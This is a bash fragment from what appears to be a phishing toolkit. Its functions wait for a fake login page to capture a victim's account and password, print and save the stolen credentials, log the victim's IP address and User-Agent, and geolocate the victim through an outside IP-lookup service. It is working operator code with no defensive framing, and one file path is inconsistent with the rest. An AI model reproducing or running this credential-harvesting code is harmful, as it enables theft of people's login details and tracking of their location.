
catch_cred() {
    account=$(grep -o 'Account:.*' ../../webpages/$server/usernames.txt | cut -d " " -f2)
    IFS=$'\n'
    password=$(grep -o 'Pass:.*' ../../webpages/$server/usernames.txt | cut -d ":" -f2)
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
    cat ../../webpages/$server/usernames.txt >> ../../webpages/$server/saved.usernames.txt
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m ../../webpages/%s/saved.usernames.txt\e[0m\n" $server
    killall -2 php > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
    killall ssh > /dev/null 2>&1
    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi
    exit 1
}

getcredentials() {
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
    while [ true ]; do
    if [[ -e "../../.webpages/$server/usernames.txt" ]]; then
        printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
        catch_cred
    fi
        sleep 1
    done
}

catch_ip() {
    touch ../../webpages/$server/saved.usernames.txt
    ip=$(grep -a 'IP:' ../../webpages/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    ua=$(grep 'User-Agent:' ../../webpages/$server/ip.txt | cut -d '"' -f2)
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
    cat ../../webpages/$server/ip.txt >> ../../webpages/$server/saved.ip.txt
    if [[ -e iptracker.log ]]; then
        rm -rf iptracker.log
    fi

    IFS='\n'
    iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
    IFS=$'\n'
    continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
    printf "\n"
    hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
    if [[ $hostnameip != "" ]]; then
        printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
    fi
        reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
            if [[ $reverse_dns != "" ]]; then
                printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
            fi
                if [[ $continent != "" ]]; then
                    printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
                fi
                    country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
                    if [[ $country != "" ]]; then
                        printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
                    fi
                        state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
                        if [[ $state != "" ]]; then
                            printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
                        fi
                            city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
                            if [[ $city != "" ]]; then
                                printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
                            fi
                                isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
                                    if [[ $isp != "" ]]; then
                                        printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
                                    fi
                                    as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
                                    if [[ $as_number != "" ]]; then
                                        printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
                                    fi
                                    ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
                                    if [[ $ip_speed != "" ]]; then
                                        printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
                                    fi
                                        ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
                                        if [[ $ip_currency != "" ]]; then
                                            printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
                                        fi
                                            printf "\n"
                                            rm -rf iptracker.log
                                            getcredentials
}